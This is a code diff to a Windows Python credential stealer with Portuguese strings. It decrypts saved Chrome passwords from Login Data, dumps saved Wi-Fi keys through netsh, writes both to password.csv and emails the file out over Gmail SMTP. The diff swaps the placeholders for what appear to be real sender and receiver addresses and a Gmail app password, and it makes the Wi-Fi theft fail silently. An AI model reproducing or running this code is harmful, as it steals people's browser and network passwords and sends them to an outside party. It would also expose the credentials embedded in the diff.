@@ -14,11 +14,11 @@ wifi_db = 'wifi.db'
 path_local = r'AppData\Local\Google\Chrome\User Data\Local State'
 path_login = r'AppData\Local\Google\Chrome\User Data\default\Login Data'
 
-ADDR = 'SENDER_EMAIL'
+ADDR = 'xablau.mpx@gmail.com'
 msg = MIMEMultipart()
 msg['Subject'] = 'Hacking'
 msg['From'] = ADDR
-msg['To'] = 'RECEIVER_MAIL'
+msg['To'] = 'vinibruno99@gmail.com'
 
 def getPassword():
     with open(os.environ['userprofile'] + os.sep + path_local, 'r', encoding='utf-8') as get_path:
@@ -47,27 +47,31 @@ def decryptPassword(buff, key_master):
         return f'1: {err}'
 
 def Get_Wifi_Password():
-    get_wifi = sp.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='cp860')
-    for network in get_wifi.split('\n'):
-        if 'Todos os Perfis de Usuários' in network:
-            two_point = network.find(':')
-            info_network = network[two_point+2:]
-            all_networks = sp.check_output(
-                ['netsh', 'wlan', 'show', 'profiles', info_network, 'key', '=', 'clear'], encoding='cp860'
-                )
-            for passwords in all_networks.split('\n'):
-                if 'Nome SSID' in passwords:
-                    two_point1 = network.find(':')
-                    names = passwords[two_point1+2:]
+    try:
+        get_wifi = sp.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='cp860')
+        for network in get_wifi.split('\n'):
+            if 'Todos os Perfis de Usuários' in network:
+                two_point = network.find(':')
+                info_network = network[two_point+2:]
+                all_networks = sp.check_output(
+                    ['netsh', 'wlan', 'show', 'profiles', info_network, 'key', '=', 'clear'], encoding='cp860'
+                    )
                 
-                if 'Conteúdo da Chave' in passwords:
-                    two_point2 = network.find(':')
-                    passwd = passwords[two_point2+2:]
-                    get_network = f'Rede: {names}\nSenha: {passwd}\n\n'
-                    with open('password.csv', 'a') as wifi:
-                        wifi.write(f'{get_network}')
-                    wifi.close()
+                for passwords in all_networks.split('\n'):
+                    if 'Nome SSID' in passwords:
+                        two_point1 = network.find(':')
+                        names = passwords[two_point1+2:]
 
+                    if 'Conteúdo da Chave' in passwords:
+                        two_point2 = network.find(':')
+                        passwd = passwords[two_point2+2:]
+                        get_network = f'Rede: {names}\nSenha: {passwd}\n\n'
+                        with open('password.csv', 'a') as wifi:
+                            wifi.write(f'{get_network}')
+                        wifi.close()
+    except:
+        pass
+        
 def Send_Email():
     try:
         file = open('password.csv', 'rb')
@@ -87,7 +91,7 @@ def Send_Email():
     with smtplib.SMTP(host='smtp.gmail.com', port=587) as smtp:
         try:
             smtp.starttls(context=context)
-            smtp.login(msg['From'], 'GMAIL_PASSWORD')
+            smtp.login(msg['From'], 'anwuekaywkgmsueb')
             smtp.sendmail(msg['From'], msg['To'], msg.as_string())
             return 'Email Send Sucess'
 
